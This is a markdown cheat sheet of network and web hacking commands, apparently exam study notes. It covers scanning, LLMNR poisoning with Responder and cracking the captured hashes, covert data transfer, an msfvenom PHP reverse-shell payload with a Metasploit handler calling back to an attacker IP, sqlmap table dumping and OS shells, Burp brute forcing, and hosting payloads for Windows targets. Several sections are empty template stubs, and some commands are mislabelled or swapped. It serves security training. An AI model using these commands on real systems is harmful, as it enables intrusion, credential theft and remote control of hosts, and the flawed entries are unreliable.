# Network Hacking

<details>
<summary>Nmap</summary>

## Nmap

* Scan for a live host

```console
nmap -sP <TARGET>
nmap -sn <TARGET>
```

* Scan for open ports

```console
nmap -p --open <port> <TARGET>
```

* OS Detection

```console
nmap -p --open <port> <TARGET>
```

* Comprehensive scan.

```console
nmap -p- --open -vv -Pn <TARGET>
```
</details>

<details>
<summary>Nmap Scripts</summary>

## Nmap Scripts

* LDAP Enumeration.

```console
nmap -p 389 --script ldap-search <TARGET>
```
</details>

<details>
<summary>NetDiscover</summary>

## NetDiscover

* Perform an ARP scan across the entire network to identify live hosts.

```console
netdiscover -i eth0
netdiscover -r <TARGET>
```
</details>

<details>
<summary>Wireshark</summary>

## Wireshark

* Wireshark offers the capability to reconstruct a stream of plain text protocol packets into a format that is easily readable by humans

```shell
select_packet > follow > TCP Stream
```

* Filter by an specific HTTP Method

```shell
http.request.method == POST
http.request.method == GET
```

* Trace a DOS/DDOS attack

```shell
# Sort by packets in IPv4 based on number of the packets transfer
Statistics > Conversations > IPv4 > Packets
```
</details>

<details>
<summary>CovertTCP</summary>

## CovertTCP

CovertTCP conceals transmission of data inside the IP header.
* [Covert_TCP](Covert_TCP.c) 

This can be used to analyze .cap files. It traverses through each line in Wireshark, targeting the identification field. Keep an eye on Hex value and ANSI value. Download and compile it.

```console
# Compiling Covert_TCP.c
cc -o covert_tcp covert_tcp.c
```

Now, specify the reciever machine (Client_IP). 

```console
sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 9999 -dest_port 8888 -server -file recieve.txt
```

Specifying the attacker machine (Attacker_IP). Create the message file that will be need to be transfered (ex. secret.txt)

```console
sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 8888 -dest_port 9999 -file secret.txt
```
The secret message is sent using Covert_TCP nad it is then captured using Wireshark.

</details>

<details>
<summary>LLMNR/NBT-NS Poisoning</summary>

## LLMNR/NBT-NS Poisoning

The tool [Responder](https://github.com/lgandx/Responder)  servers as a rogue authentication server to capture hashes. Utilizing this method, one could obtain the password of a logged-in user who is attempting to access an unavailable shared resource.

* On Unix based systems

```console
# where -I = interface
responder -I eth0
```
On Windows, you could try to access shared resources. Logs are stored at usr/share/responder/logs/SMB. You can crack the hash using John The Ripper.

```console
john SMBfilename  
```
</details>

# Web Hacking

<details>
<summary>NSLookup</summary>

## NSLookup

You can use NSLookup to find the IP Address of a website.

```console
nslookup www.example.com
```
</details>

<details>
<summary>Banner Grabbing</summary>

## Telnet

```console
telnet www.moviescope.com 80

# Double enter
GET / HTTP/1.0
```

## whatweb

```console
# Default banner grabbing
whatweb www.example.com

# Verbose grabbing
whatweb -v www.example.com
```

## OpenSSL

You can perform banner grabbing over SSL using OpenSSL.

```console
# Install OpenSSL
sudo apt install openssl -y
openssl
s_client –host www.example.com -port 443
GET/HTTP/1.0
```

## Curl

```console
# HTTP Get request from a proxy
curl -x <proxy_IP>:8080 http://localhost/
```
</details>

<details>
<summary>Local File Inclusion</summary>

## Local File Inclusion

Create an PHP payload using msfvenom

```console
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attacker-port -f raw
```

Create the Reverse Shell with Metasploit

```console
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run
```

</details>

<details>
<summary>Web Spidering</summary>

## zaproxy

You can perform web spidering using zaproxy.

```shell
Automated Scan > http://www.example.com > Attack > Active Scan > Spider Tab > Alerts > Spider > Messages
```
</details>

<details>
<summary>Burpsuite</summary>

## Brute Forcing with Burpsuite

* You can perform a brute force attack using Burpsuite. 

```shell
# First, set up the Proxy.
Firefox Preferences > Proxy > Settings > Manual Proxy > 127.0.0.1 and Port 8080 > Check "Also use this proxy for FTP and HTTPS" > Ok

# Then fire up Burpsuite
Proxy > "Intercept On" > Switch to Firefox -> Go to the target website > Enter Random Credentials > Switch to Burpsuite

# Setting the payloads
Right click > Send to intruder > Intruder > Positions > Clear  > Cluster bomb under Attack type

# Username and password payload
Select the username > Add Payload > Select the Password > Add Payload

# Go to the payload tab
Payloads Tab > Payload set: 1 and type: Simple list 

# Under Payload options
Load > Select a wordlist like username.txt

# Do the same for the password
Payload set: 2 and type: Simple list > Under Payload options > Load > Select a wordlist like password.txt > Start attack
```

When finished, look at the status code of every attempt. 

</details>

<details>
<summary>SQLMap</summary>

## SQLMap

* List databases

```console
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; --dbs
```

* Alternative

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; --data="id=1&Submit=Submit" --dbs  
```

* Listing tables of a database name

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; -D database_name -T target_Table --columns
```

* Listing the columns of such table

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; -D database_name --tables
```

* Dump data

```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; -D database_name -T target_Table --dump
```

* Setting OS Shell

```console
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="Cookie"; ui-tabs-1=0 --os-shell
```

</details>

<details>
<summary>DLSS</summary>

## DLSS

Damn Small SQLi Scanner (DSSS) is a comprehensive tool designed for detecting SQL injection vulnerabilities. It is fully functional and capable of scanning both GET and POST parameters. Regarding optional configurations, it provides support for HTTP proxy along with HTTP header values such as User-Agent, Referer, and Cookie.

```console
python3 dsss.py -u "URL" --cookie="cookie"

# Then open the generated URL

```
</details>

# Steganography

<details>
<summary>Snow</summary>

## Snow

* Hide text

```console
snow.exe -c -p test -m "Secret Message" original.txt hide.txt
```

* Unhide text

```console
snow.exe -c -p test hide.txt
```

</details>

<details>
<summary>HashCalc</summary>

## HashCalc

* When opening the file, ensure MD5, SHA1, RIPEMD160 and CRC32 are selected. Then compare the hash after modiying the file.

</details>

<details>
<summary>HashMyFile</summary>

## HashMyFile

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>MD5 Calculator</summary>

## MD5 Calculator

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>VeraCrypt</summary>

## VeraCrypt

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>BCTextEncoded</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Keywords</summary>

## Keywords

* Image hidden > OpenStego
* File .hex > CrypTool
* Whitespace > Snow
* MD5 > HashCalc & MD5 Calculator
* Volume & Mount > VeraCrypt

</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

# Transfering Files

<details>
<summary>Apache</summary>

## Hacking Tool

* You can transfer local payloads to Windows using this way.

```shell
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /root/Desktop/filename /var/www/html/share/
service apache2 start 
service apache2 status
```

* Then to download open a browser

```console
attacker_ip/share
```

* Windows to Linux > File System > Network > smb//Windows_IP

</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>
